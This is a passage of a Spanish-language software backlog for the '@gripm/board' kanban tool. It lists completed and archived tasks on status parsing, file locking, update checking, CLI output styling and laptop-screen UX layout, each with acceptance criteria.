- [x] #2 `PUT /api/items/:id` delega la actualización en `BacklogService.updateTask` preservando la detección de conflictos `409` por `expectedMtime`
- [x] #3 `POST /api/items/bulk` delega la actualización masiva en `BacklogService.bulkUpdateTasks`
- [x] #4 La normalización de updates en `BacklogService.updateTask` se realiza en una única función pura compartida entre motores Markdown y JSON
- [x] #5 La suite completa de tests de integración (`npm test`) y seguridad de API pasa con código de salida 0

---

#### [DEV-312] Paridad de Estados: Soporte Canónico de 'blocked' (con blocked_reason) y 'dismissed' en el Tablero y Parser
- **Prioridad**: `high` | **Tipo**: `feature`

Alinear la máquina de estados de `@gripm/board` con el estándar canónico de `@gripm/playbook` v2.3.0 (`.agents/STATE_MACHINE.md`), incorporando `blocked` (junto con el metadato obligatorio `blocked_reason`) y formalizando `dismissed` en el parser Markdown, el servidor MCP y la interfaz visual.

### Diagnóstico de la Causa Raíz:

1. **Degradación Silenciosa de `blocked` a `draft`:**
   En `scripts/backlogMdParser.ts`, el tipo `CanonicalStatus` omite `blocked`. En la función `normalizeStatus`, cualquier tarea con `status: blocked` cae en la rama `default: return 'draft'`. Si un agente o usuario marca una tarea como bloqueada conforme a la metodología Playbook, Gripm Board destruye el estado al leer o guardar el archivo.
   
2. **Falta del Campo `blocked_reason` y `dismissed_reason`:**
   La máquina de estados del Playbook establece que `blocked` exige un motivo no vacío (`blocked_reason`) para evitar la inflación de WIP, y que `dismissed` exige `dismissed_reason`. Actualmente, `BacklogMdTask` y `BacklogItem` no modelan estos campos como propiedades formales de primer nivel.

3. **Inconsistencia de `cancelled`:**
   `CanonicalStatus` declara `'cancelled'` en su tipo unión, pero `normalizeStatus('cancelled')` devuelve `'dismissed'`, generando ambigüedad entre el tipado estático y el runtime.

### Solución Técnica:

- Incorporar `'blocked'` en `CanonicalStatus` (`scripts/backlogMdParser.ts`) y en `ItemStatus` (`src/types.ts`).
- Actualizar `normalizeStatus` para que devuelva `'blocked'` cuando reciba `'blocked'` o `'impediment'`.
- Añadir `blockedReason` y `dismissedReason` al modelo de datos de tareas y mapearlo en frontmatter (`blocked_reason` / `dismissed_reason`).
- Integrar la columna / badge visual de tareas bloqueadas en `KanbanBoard` e `ItemCard`, y el campo de motivo en `ItemModal`.

**Criterios de Aceptación:**
- [x] #1 `CanonicalStatus` e `ItemStatus` incluyen `'blocked'` como valor válido de primera clase
- [x] #2 `normalizeStatus('blocked')` devuelve `'blocked'` y nunca se degrada a `'draft'`
- [x] #3 `backlogMdParser.ts` parsea y serializa `blocked_reason` y `dismissed_reason` en el frontmatter YAML
- [x] #4 `ItemModal` permite ingresar y editar el motivo de bloqueo cuando una tarea pasa a `blocked`
- [x] #5 `KanbanBoard` e `ItemCard` muestran visualmente el indicador de bloqueo con su tooltip descriptivo

---

#### [DEV-314] Concurrencia inter-proceso: Lockfile atomico en asignacion de IDs correlativos y mutaciones compartidas
- **Prioridad**: `high` | **Tipo**: `enhancement`
**Criterios de Aceptación:**
- [x] #1 Implementar un módulo utilitario de lockfile atómico (`src/server/utils/fs-lock.ts` o equivalente) con soporte de timeout y liberación garantizada en `finally`.
- [x] #2 La función de generación de próximo ID correlativo adquiere el lock antes de inspeccionar IDs y lo libera una vez creado el archivo en disco.
- [x] #3 Las mutaciones en `releases.json` y `retrospectives.json` están protegidas por locks atómicos por archivo durante la lectura y escritura.
- [x] #4 Manejo defensivo de stale locks huérfanos con verificación de timestamp de expiración (e.g. 5000ms de gracia máxima).
- [x] #5 Pruebas unitarias que simulen concurrencia entre dos operaciones simultáneas de creación de tarea demostrando que se asignan IDs consecutivos sin colisión ni error no controlado.
- [x] #6 La Pirámide de Verificación (`tsc --noEmit`, `npm test`, `npm run backlog:check`) pasa con 0 errores.

---

#### [DEV-316] Erradicacion de remanentes anti-em-dash en generadores automaticos y documentacion de arquitectura
- **Prioridad**: `low` | **Tipo**: `debt`
**Criterios de Aceptación:**
- [x] #1 Escanear el repositorio en busca de caracteres em-dash y en-dash en código, plantillas y documentación Markdown.
- [x] #2 Reemplazar todos los hallazgos por el guión estándar ` - ` con espacios o el guión simple `-`.
- [x] #3 Incorporar una verificación mecánica en `scripts/verify-changes.js` que falle si algún archivo stageado contiene em-dash o en-dash.
- [x] #4 Verificar que `npm run backlog:sync` y los generadores de releases y tareas no generen guiones largos bajo ninguna circunstancia.
- [x] #5 La Pirámide de Verificación (`tsc --noEmit`, `npm test`, `node scripts/verify-changes.js --all`) pasa con 0 errores.

---

#### [DEV-317] Compatibilidad macOS: Excepción de directorio temporal en isSystemRootDir para fsExplorer
- **Prioridad**: `high` | **Tipo**: `bug`

En sistemas operativos basados en Darwin/macOS, la ruta de directorios temporales asignada por el sistema (`os.tmpdir()`) se ubica bajo `/var/folders/...`, y en ciertas distribuciones Linux bajo `/var/tmp/`.

En la implementación de `server/services/fsExplorer.ts`, la función de protección `isSystemRootDir` bloqueaba preventivamente cualquier ruta que comience con `/var`, catalogándola erróneamente como directorio raíz del sistema (`isSystemRootDir` -> `true`).

Esto causaba que cualquier fixture de prueba o proyecto temporal creado dentro de `os.tmpdir()` fuera bloqueado con `403 Forbidden` en endpoints como `POST /api/projects`, provocando fallos sistemáticos en runners de CI sobre `macos-latest` (por ejemplo en `scripts/verify-optimistic-locking.js`).

### Solución Implementada:
- Incorporada una verificación explícita en `isSystemRootDir` que excluye del bloqueo de raíces de sistema cualquier ruta contenida dentro de `os.tmpdir()` (y su correspondiente `fs.realpathSync(os.tmpdir())`).
- Preservado el bloqueo estricto de `/var`, `/etc`, `/usr`, `C:\Windows` y demás rutas protegidas del sistema operativo.

**Criterios de Aceptación:**
- [x] #1 AC #1: `isSystemRootDir` devuelve `false` para cualquier subdirectorio contenido dentro de `os.tmpdir()` tanto en Windows como en macOS y Linux.
- [x] #2 AC #2: `isAllowedBrowsePath` autoriza la exploración y registro de repositorios temporales creados en `os.tmpdir()` (`POST /api/projects`).
- [x] #3 AC #3: Rutas reales del sistema operativo (`/etc`, `/var`, `/usr`, `C:\Windows`) continúan estrictamente bloqueadas con `403 Forbidden`.
- [x] #4 AC #4: La suite de pruebas de seguridad y concurrencia optimista pasa sin errores en todas las plataformas (`node scripts/test-api-security.js` y `node scripts/verify-optimistic-locking.js`).

---

#### [DEV-318] Verificador de actualizaciones: consulta directa a npm Registry, ajuste de TTL y resiliencia de caché
- **Prioridad**: `high` | **Tipo**: `bug`

El sistema de verificación de actualizaciones (`scripts/updateChecker.js`) notificaba versiones desfasadas respecto al comando de instalación sugerido (`npm i -g @gripm/board@latest`), provocando situaciones donde la terminal o la interfaz web reportaban una versión disponible anterior (ej. `v1.3.0 → v1.6.0`) cuando npm instalaba una versión más reciente (ej. `1.6.1`).

### Causa Raíz Identificada:
1. **Desalineación de fuente de verdad:** `updateChecker.js` consultaba exclusivamente la API de GitHub Releases (`api.github.com/repos/.../releases/latest`), sujeta a demoras de marcado, rate limits no autenticados (60 req/h) y divergencias con el registry público de npm donde se distribuye `@gripm/board`.
2. **TTL rígido de caché (24 horas):** La ventana de persistencia en `update-cache.json` (`CACHE_TTL_MS = 24 * 60 * 60 * 1000`) impedía detectar releases publicados durante el mismo día y no se invalidaba al actualizar el paquete localmente.
3. **Condición restrictiva en listeners asíncronos:** En `bin/gripm.js` y `scripts/mcp-server.ts`, el callback de fondo evaluaba `if (res.hasUpdate && !cachedUpdate?.hasUpdate)`, descartando cualquier versión más reciente que la cacheada previamente si `hasUpdate` ya estaba activo.

### Solución Implementada:
- Priorizada la consulta directa a `https://registry.npmjs.org/@gripm/board/latest` (con fallback de resiliencia a GitHub Releases API).
- Reducido el TTL de caché de 24 horas a 4 horas e implementada la invalidación/limpieza automática de `hasUpdate` cuando la versión en ejecución sea mayor o igual a la última conocida.
- `bin/gripm.js` y `scripts/mcp-server.ts` ahora actualizan el aviso si la versión detectada en vivo es mayor que la que estaba en caché (`semverGreaterThan(res.latestVersion, cachedUpdate.latestVersion)`).

**Criterios de Aceptación:**
- [x] #1 AC #1: `checkForUpdates` en `scripts/updateChecker.js` consulta prioritariamente el registry público de npm (`https://registry.npmjs.org/@gripm/board/latest`), extrayendo el campo `version` canónico con fallback a GitHub Releases.
- [x] #2 AC #2: Reducir `CACHE_TTL_MS` a 4 horas e invalidar/actualizar `hasUpdate: false` en `update-cache.json` cuando `currentVersion` sea igual o mayor que `latestVersion`.
- [x] #3 AC #3: `bin/gripm.js` y `scripts/mcp-server.ts` actualizan el banner en vivo si la comprobación asíncrona descubre una versión superior a la que existía en el caché.
- [x] #4 AC #4: Pruebas automatizadas en `scripts/verify-integration.js` validan la consulta simulada, la invalidación de caché y las comparaciones semver.
- [x] #5 AC #5: Pirámide de verificación en verde (`npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run build`).

---

#### [DEV-319] Rediseño y estandarización visual de interfaz CLI en sync-playbook
- **Prioridad**: `medium` | **Tipo**: `feature`

Rediseñar la salida en terminal del sincronizador de Playbook (`scripts/sync-playbook.mjs`) adoptando la directiva de diseño de interfaz CLI establecida en DEV-252 (estándares clig.dev, Vite, Next.js):
1. Erradicar la caja rígida cerrada Unicode (`┌─┐`, `│`, `└─┘`) en el banner de arranque a favor de un formato abierto con sangría consistente y punteros sobrios (`➜`).
2. Eliminar la saturación de emojis decorativos ("emoji soup": `🛡️`, `➖`, `✨`, `🔄`, `🧩`, `🔏`, `📊`) sustituyéndolos por glifos mono-ancho (`•`, `▲`, `✔`, `✖`) con etiquetas de ancho fijo (`padEnd(10)`) que alinean los nombres de archivo exactamente en la misma columna.
3. Formatear el bloque de resumen (`Summary`) con jerarquía limpia sin emojis decorativos y sangría consistente.
4. Reemplazar guiones largos artificiales (em-dash) por el guión simple estándar con espacios (` - `) en cumplimiento de la Regla 25.
5. Preservar el soporte semántico de colores ANSI respetando entornos `NO_COLOR` y terminales no interactivas (no-TTY).

**Criterios de Aceptación:**
- [x] #1 Erradicada la caja Unicode cerrada en printBanner a favor de un encabezado limpio y abierto con punteros ➜
- [x] #2 Reemplazada la sopa de emojis en las líneas de estado por glifos mono-ancho y etiquetas alineadas a 10 caracteres
- [x] #3 Bloque de resumen formateado limpiamente sin emoji de gráfico y con sangría consistente
- [x] #4 Erradicado el uso de guiones largos (em-dash) en notas de estado y descripciones
- [x] #5 Salida ANSI respeta NO_COLOR y TTY
- [x] #6 Sincronizados los cambios en gripm y gripm-playbook manteniendo la suite de pruebas y pirámide de verificación en verde

---

#### [DEV-320] Estandarización visual integral de la interfaz CLI, guards y herramientas
- **Prioridad**: `high` | **Tipo**: `feature`

Completar la homogeneización visual absoluta de la interfaz de terminal (CLI), guards y scripts de soporte en todo el ecosistema de gripm según los estándares modernos de DEV-252 (clig.dev, Vite, Next.js):
1. **bin/gripm.js:** Modernizar el bloque de advertencia y tokens efímeros de red local (--host 0.0.0.0), sustituyendo emojis por punteros sobrios (➜) y glifo de advertencia (▲).
2. **scripts/gripm-cli.ts:** Rediseñar el dashboard de métricas (--stats), eliminando emojis decorativos y bordes dobles a favor de una estructura abierta con sangría uniforme y colores ANSI semánticos. Limpiar mensajes de export y check.
3. **scripts/gate-qa.mjs:** Erradicar cajas rígidas (=== / ---) y emojis en el auditor ejecutable de QA a favor de encabezado abierto estilo gripm, lista alineada y veredictos con ✔ y ✖.
4. **scripts/audit-ux-code.cjs:** Modernizar encabezado y reporte humano de auditoría estática de UX, erradicando cajas de signos de igual.
5. **scripts/verify-backlog-sync.js:** Limpiar prefijos redundantes entre corchetes ([gripm Guard], [Consolidado]) y emojis (🔍, 📄, 🛑, ✅) a favor de mensajes atómicos y sobrios.
6. **scripts/verify-publish-surface.js:** Eliminar corchetes y emojis festivos (🎉, 📦), adoptando checks mono-ancho consistentes.
7. **scripts/generate-changelog.cjs:** Estandarizar la salida de regeneración de changelog.
8. **scripts/run-tests.js:** Sustituir emojis ✅ y ❌ por ✔ y ✖ en el resumen secuencial de la suite de pruebas.
9. **Paridad con Playbook:** Reflejar las mejoras correspondientes en las herramientas de gripm-playbook.

**Criterios de Aceptación:**
- [x] #1 Modernizada la advertencia de red LAN en bin/gripm.js (--host 0.0.0.0) sin emojis decorativos
- [x] #2 Rediseñado el dashboard de métricas y mensajes en scripts/gripm-cli.ts bajo la jerarquía abierta estándar
- [x] #3 Modernizada la salida de scripts/gate-qa.mjs con encabezado abierto, punteros ➜ y glifos mono-ancho
- [x] #4 Limpiado el reporte de auditoría en scripts/audit-ux-code.cjs sin recuadros de signos =
- [x] #5 Estandarizadas las salidas de guards (verify-backlog-sync.js, verify-publish-surface.js, generate-changelog.cjs, run-tests.js)
- [x] #6 Cero em-dashes y soporte total de NO_COLOR en todas las herramientas intervenidas
- [x] #7 Sincronización en gripm-playbook y Pirámide de Verificación completa en verde

---

#### [DEV-321] Optimización Integral de Densidad UX en 1366x768 y Viewports Reales de Portátil (1366x650)
- **Prioridad**: `high` | **Tipo**: `ux`

Auditoría y resolución integral de los problemas de densidad vertical y horizontal en pantallas de portátil de `1366x768` (considerando tanto el viewport completo `1366x768` como el alto útil real de navegador `1366x650` tras descontar barra de tareas del sistema operativo y pestañas/barra de direcciones del navegador), validado pantalla por pantalla con Playwright en Español e Inglés.

### Invariante de Diseño Obligatorio (Restricción Negativa):
- **El scroll horizontal en las columnas del tablero Kanban es 100% intencional por diseño.** Queda terminantemente prohibido alterar el ancho mínimo de las columnas del Kanban o intentar forzar que todas las columnas entren sin scroll horizontal.

### Diagnóstico Pantalla por Pantalla Pendiente de Resolver:

1. **Modal de Edición / Creación de Ítem (`src/components/ItemModal.tsx` y subcomponentes en `src/components/item-modal/`):**
   - En `1366x768` (y más aún en `1366x650`), la combinación de paddings verticales amplios, `textarea` de descripción y la sección `Implementation Plan & Plan Guard` desplegada por defecto empuja la sección crítica de **Acceptance Criteria (AC)** completamente fuera del área visible inicial (no se ve ni un solo criterio sin scrollear).
   - En la columna lateral derecha (`Item Attributes`), el bloque de `Labels` y sus chips quedan cortados al ras del footer.
   - Se requiere compactar la densidad vertical en alturas `<= 800px` (paddings, gaps, colapso inteligente de secciones secundarias vacías o no prioritarias) para que Título, Descripción, Estado/Atributos y el inicio de Acceptance Criteria sean visibles de inmediato sin cortes.

2. **Popover de Filtros Avanzados (`src/components/AdvancedFiltersPopover.tsx`):**
   - Limitar `max-h` únicamente agrega scroll interno a una lista vertical larga de una sola columna (`420px`), dejando **Target Release**, **Sprint** y el botón de **Reset** enterrados debajo del pliegue en `1366x768` / `1366x650`.
   - Se requiere un layout más compacto (grilla de 2 columnas o chips de menor altura/espaciado vertical) para que todos los grupos de filtros y el pie de acciones entren de un vistazo sin requerir scroll interno salvo cuando existan decenas de releases/sprints.

3. **Header con las 5 Pestañas Activas en Español e Inglés (`src/components/Header.tsx`):**
   - Validar y blindar el presupuesto horizontal en `1366px` y `1280px` cuando están activas simultáneamente las **5 pestañas** (`Tablero`, `Sprints`, `Versiones`, `Cronograma`, `Métricas`), junto con nombre de proyecto largo, badge de nueva versión (`vX.Y.Z`), indicador de sincronización, botón `Re-sync /docs`, utilidades y CTA `+ Nueva Tarea`, garantizando cero solapamientos y cero salto de línea en botones.

4. **Vistas Principales y Modales Secundarios en `1366x768` / `1366x650`:**
   - **SprintView (`src/components/SprintView.tsx`):** Verificar y ajustar cabeceras de sprint, métricas superiores y listas de tareas para no desperdiciar más del 35% del alto útil de `650px` en banners estáticos antes de ver las tareas.
   - **TimelineView (`src/components/TimelineView.tsx`):** Verificar controles de zoom/rango, cabeceras de fechas y filas del cronograma sin cortes ni desbordes de controles.
   - **ReleaseAssembler (`src/components/ReleaseAssembler.tsx`) y ReleaseView (`src/components/ReleaseView.tsx`):** Asegurar que el panel de armado de release, preview de notas y selector de ítems `ready` funcionen sin recorte vertical en `650px - 768px` de alto.
   - **SettingsView (`src/components/SettingsView.tsx`):** Verificar tabs/secciones de configuración y controles sin truncamientos ni desbordes en `1366x768`.
   - **Modales operativos (`ImportWizardModal.tsx`, `SprintModal.tsx`, `CompleteSprintModal.tsx`, `ProjectModal.tsx`, `TrashModal.tsx`, `KeyboardShortcutsModal.tsx`):** Auditar y ajustar alturas máximas, paddings de cabecera/pie y scroll interno en viewport de `1366x650`.

**Criterios de Aceptación:**
- [x] #1 Con las 5 pestañas habilitadas en Español (`Tablero`, `Sprints`, `Versiones`, `Cronograma`, `Métricas`), badge de actualización visible, botón `Re-sync /docs` y nombre de proyecto de 25 caracteres, el `Header` en `1366x768` y `1280x800` mantiene separación `>= 16px` entre bloques y `0` saltos de línea en botones
- [x] #2 En `ItemModal` abierto a `1366x768` y `1366x650`, la cabecera de `Acceptance Criteria` y al menos los primeros criterios son visibles sin necesidad de scroll inicial, y todos los campos de la barra lateral derecha (`Status`, `Priority`, `Type`, `Sprint`, `Release`, `Dates`, `Assignees`, `Labels`) quedan accesibles sin recortes
- [x] #3 `AdvancedFiltersPopover` presenta una disposición compacta donde las secciones de estado, tipo, prioridad, release/sprint y el botón de reset son visibles simultáneamente en `1366x768` sin corte inferior
- [x] #4 `SprintView`, `TimelineView`, `ReleaseView` / `ReleaseAssembler`, `MetricsView` y `SettingsView` pasan validación visual y geométrica automatizada con Playwright en `1366x768` y `1366x650` (ES y EN) sin elementos solapados ni recortados
- [x] #5 Todos los modales secundarios (`ImportWizardModal`, `SprintModal`, `CompleteSprintModal`, `ProjectModal`, `TrashModal`, `KeyboardShortcutsModal`) mantienen cabecera y pie de acciones 100% visibles dentro de un viewport de `1366x650`
- [x] #6 El scroll horizontal de las columnas del `KanbanBoard` se mantiene intacto sin alteraciones

---

#### [DEV-322] Menú de desbordamiento en Header para portátiles y tablets (botón Nueva Tarea fuera de pantalla en 1366x768)
- **Prioridad**: `high` | **Tipo**: `bug`

En `1366x768` el botón `+ Nueva Tarea` del `Header` quedaba fuera del viewport tras v1.8.0 (se sumó el botón de Command Palette). Entre `768px` y `1535px` se agrupan las acciones secundarias (Command Palette, atajos, idioma, tema y Papelera con contador) en un popover `⋯` ("Más acciones"). Desde `1536px` (2xl) el header conserva todos los botones sueltos. Por debajo de `768px` se mantiene el drawer hamburguesa, que ahora incluye la Papelera.

**Criterios de Aceptación:**
- [x] #1 En `1366x768` el botón `+ Nueva Tarea` es visible y las acciones secundarias están agrupadas en el popover `⋯` (validado manualmente por el PO con `npm run dev`)
- [x] #2 Desde `1536px` el header conserva todos los botones sueltos sin cambios visuales
- [x] #3 El popover se cierra con `Escape` y con clic exterior, y la clave i18n `header.moreActions` existe en `es.json` y `en.json`
- [x] #4 El drawer móvil incluye la entrada Papelera
- [x] #5 `npx tsc --noEmit` y `npm test` (21 pasos) pasan con código 0

---

### 📦 Archivadas / Descartadas (4)

#### [DEV-119] Reescritura Quirúrgica del Historial Git para Eliminación de Datos Comprometedores
- **Prioridad**: `urgent` | **Tipo**: `bug`

Utilizar `git-filter-repo` para reescribir el historial de Git eliminando rutas absolutas personales y referencias a proyectos privados externos, sin perder información valiosa de commits.

> [!NOTE]
> **Descartada / Suprimida:** Se acordó conservar el repositorio `dev-board` como archivo histórico personal e inmutable privado, e inicializar un nuevo repositorio público limpio e independiente en GitHub (`pablojavierrodriguez/gripm`) con un único commit inicial consolidado en `v1.0.0`. Esta estrategia de bifurcación limpia elimina completamente la necesidad y los riesgos de reescritura destructiva de historial con `git-filter-repo`.

**Criterios de Aceptación:**
- [ ] #1 Instalar `git-filter-repo` en el sistema (`pip install git-filter-repo` o `brew install git-filter-repo`)
- [ ] #2 Crear archivo de expresiones de reemplazo que cubra: rutas absolutas `/Users/<usuario>/<ruta-personal>` → placeholder neutro, descripciones del proyecto DOM → `<redacted>`, sin tocar `pablojavierrodriguez` ni el nombre `Pablo`
- [ ] #3 Ejecutar `git filter-repo --replace-text expressions.txt` exitosamente sobre todo el historial local
- [ ] #4 Verificar con `git log --all -p | grep -c "/Users/<usuario>/<ruta-personal>` que retorna 0 ocurrencias
- [ ] #5 Verificar que los tags existentes (v0.2.0 a v0.6.1) se preservan correctamente post-rewrite
- [ ] #6 Verificar que `npm test` y `npx tsc --noEmit` pasan exitosamente post-rewrite
- [ ] #7 Documentar el comando exacto de `git push --force` que el usuario debe ejecutar para publicar al remote, con instrucciones de contexto claras

---

#### [DEV-156] Normalizacion Canonica de Slugs de Tareas en Backlog dev a DEV
- **Prioridad**: `medium` | **Tipo**: `chore`

Resolución del hallazgo §5.2 de la auditoría (`docs/OPEN_SOURCE_LAUNCH_AUDIT.md`):

`AGENTS.md` §6.4 establece la regla canónica de nombres de archivos: `DEV-XXX - slug-descriptivo.md`. Actualmente, 101 de las 150 tareas históricas en `backlog/tasks/` tienen formato en minúsculas `dev-0XX - ...`, lo cual genera inconsistencia en el repositorio y contradice las normas operativas escritas.

Se deben normalizar los nombres de los 101 archivos preservando su frontmatter, sus criterios de aceptación y actualizando de forma transparente y determinista `BACKLOG.md` mediante `npm run backlog:sync`.

**Criterios de Aceptación:**
- [ ] #1 Todos los archivos en `backlog/tasks/` siguen el patrón estricto `DEV-XXX - ...md` (0 archivos con prefijo en minúscula `dev-`)
- [ ] #2 `npm run backlog:sync` y `npm run backlog:check` finalizan con código 0
- [ ] #3 `npx tsc --noEmit` y `npm test` verifican que no haya rutas relativas rotas en tests o scripts

---

#### [DEV-264] Estándar de densidad de escritorio a 1366×768: medición, presupuesto y cero scroll horizontal
- **Prioridad**: `high` | **Tipo**: `ux`

Este ítem existe para **respaldar una promesa que el producto ya hace pública**. Los dos
README dicen que la demo está *"Optimized for desktop"* / *"Optimizada para escritorio"*.

Esa afirmación tiene una parte verdadera y una que no. Es verdad que el tablero **prioriza**
el escritorio y que mobile no está hecho (DEV-207). Lo que no está respaldado es la
calidad: **escritorio tampoco está impecable a anchos comunes**, y el README es la única
fuente de esa promesa. Si alguien la toma literalmente y encuentra el tablero apretado a
1366, el README queda desmentido por el producto.

El caso de uso real de este ítem es la **demo pública de `gripm.vercel.app`**, que se
comunicó como experiencia desktop.

**Criterios de Aceptación:**
- [ ] #1 Medición documentada a 1366×768 y 1440×900 de: scroll horizontal del tablero, columnas cortadas, filtros, contadores y modales anchos
- [ ] #2 Presupuesto de densidad declarado y verificable: ancho mínimo por columna del tablero, cuántas son visibles sin scroll en la vista por defecto, ancho máximo de modales y el umbral declarado a partir del cual el scroll horizontal pasa a ser intencional
- [ ] #3 Inventario de los 45 hallazgos `UX-007` clasificados en "aprieta a escritorio" / "solo móvil", con el criterio escrito y la lista de aceptados dentro de este ítem
- [ ] #4 El tablero no requiere scroll horizontal en su vista por defecto a 1366×768, incluida la columna `Completado`
- [ ] #5 Los modales anchos (`ItemModal`, `SettingsView`, `ReleaseAssembler`, `CompleteSprintModal`, `PlanGuardModal`) no muestran texto truncado ni solapado a 1366×768
- [ ] #6 Verificado en ambos idiomas y en ambos temas, sin overflow horizontal accidental
- [ ] #7 La medición, el presupuesto de densidad y la clasificación de `UX-007` quedan escritos en un artefacto versionado bajo `docs/ux/`, y ese artefacto es el estándar contra el que se certifica DEV-265 y se diseña DEV-207
- [ ] #8 El README sigue reflejando el estado real: si la experiencia desktop queda buena, el texto se ajusta en el mismo commit con evidencia; si no, se conserva el texto actual y este ítem explica por qué
- [ ] #9 `npm run audit:ux` en verde **sin regenerar el baseline a ciegas**, `npx tsc --noEmit` con 0 errores, `npm test` con 17/17, `npm run test:ui` en verde y `npm run backlog:check` con código 0

---

#### [DEV-269] Calidad visual de escritorio: jerarquía, estados, motion y cero CLS a 1366×768
- **Prioridad**: `high` | **Tipo**: `ux`

Este ítem es **la segunda mitad de DEV-264**, que se dividió porque ampliación de alcance y
ejecutabilidad son cosas distintas: un ítem de 16 criterios no se puede certificar, y un
ítem que no se puede certificar no es un estándar, es una lista de deseos.

La división es por **naturaleza del trabajo**, no por tamaño:

- **DEV-264** (núcleo duro, quick win de escritorio) mide el defecto real, declara el
  presupuesto de densidad, clasifica los 45 `UX-007`, elimina el scroll horizontal de la
  vista por defecto y desbloquea a DEV-265.
- **DEV-269** (este) aplica, sobre el presupuesto ya declarado, los criterios de diseño que
  la skill `worldclass-product-designer` ya define y que hoy **no tienen ninguna auditoría
  que los vuelva obligatorios**.

**Criterios de Aceptación:**
- [ ] #1 Escala tipográfica cerrada en las superficies de escritorio: cero `text-[Npx]` arbitrario en `ItemCard`, `ItemModal`, `Header`, barra de filtros y vistas; todo valor nuevo es token o valor de la escala
- [ ] #2 Cifras tabulares en toda columna numérica y en todo valor que cambia en vivo, sin salto de dígitos al actualizar el tablero
- [ ] #3 Tokens semánticos en lugar de hex hardcodeado en las superficies tocadas, con el tema cambiando sin editar componentes
- [ ] #4 Contraste suficiente en **ambos temas** sobre las superficies principales: sin grises muertos ni texto que solo se lea en dark
- [ ] #5 Tracking fino en mayúsculas pequeñas para etiquetas y ninguna mayúscula en párrafo en las superficies tocadas
- [ ] #6 Los siete estados (default, hover, active/focus, disabled, loading, empty, error) definidos y resueltos en `ItemCard`, `ItemModal`, `Header`, barra de filtros, `Toast` y vistas
- [ ] #7 El estado vacío es sereno y ofrece el siguiente paso; **cero** estados vacíos que usen alerta, color de error o el texto "no hay nada"
- [ ] #8 Focus ring siempre visible para navegación por teclado en toda acción interactiva de escritorio, con `disabled` recordando el motivo
- [ ] #9 Respuesta en el mismo frame a toda acción interactiva (`active:scale-[0.98]` o cambio de fondo equivalente)
- [ ] #10 Transiciones de 150 - 250ms para cambio de estado, más largas solo para entrada/salida de superficies, y `prefers-reduced-motion` respetado
- [ ] #11 Cero CLS a 1366×768 en las cinco transiciones: carga inicial, cambio de idioma, cambio de filtro, cambio de vista y movimiento de tarjeta entre columnas
- [ ] #12 Ninguna de las correcciones reintroduce scroll horizontal ni desborde: se reverifica el presupuesto de densidad de DEV-264
- [ ] #13 Verificado en ambos idiomas, sin literales sueltos fuera de `es.json` / `en.json`
- [ ] #14 `npm run audit:ux` en verde **sin regenerar el baseline a ciegas**, `npx tsc --noEmit` con 0 errores, `npm test` con 17/17, `npm run test:ui` en verde y `npm run backlog:check` con código 0

---
